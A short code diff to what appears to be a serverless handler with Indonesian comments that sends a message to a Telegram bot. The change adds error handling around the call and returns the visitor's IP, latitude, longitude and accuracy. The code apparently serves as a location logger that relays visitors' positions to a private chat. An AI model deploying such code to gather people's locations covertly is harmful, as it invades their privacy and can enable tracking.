@@ -32,21 +32,26 @@ export default async function handler(req, res) {
     msg += `\n🕐 Waktu: ${new Date().toISOString()}`;
     
     // Kirim ke Telegram
-    const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: msg })
-    });
+    let tgResult = null;
+    let tgError = null;
     
-    const tgResult = await tgResponse.json();
-    
-    // Log ke Vercel console
-    console.log('Telegram send result:', tgResult);
+    try {
+        const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: msg })
+        });
+        tgResult = await tgResponse.json();
+        console.log('Telegram OK:', tgResult);
+    } catch (err) {
+        tgError = err.message;
+        console.error('Telegram error:', err);
+    }
     
     // Return response
     res.json({ 
-        status: 'ok', 
-        telegram: tgResult,
+        status: 'ok',
+        telegram: tgResult || { error: tgError },
         data: { ip, lat, lon, accuracy }
     });
 }
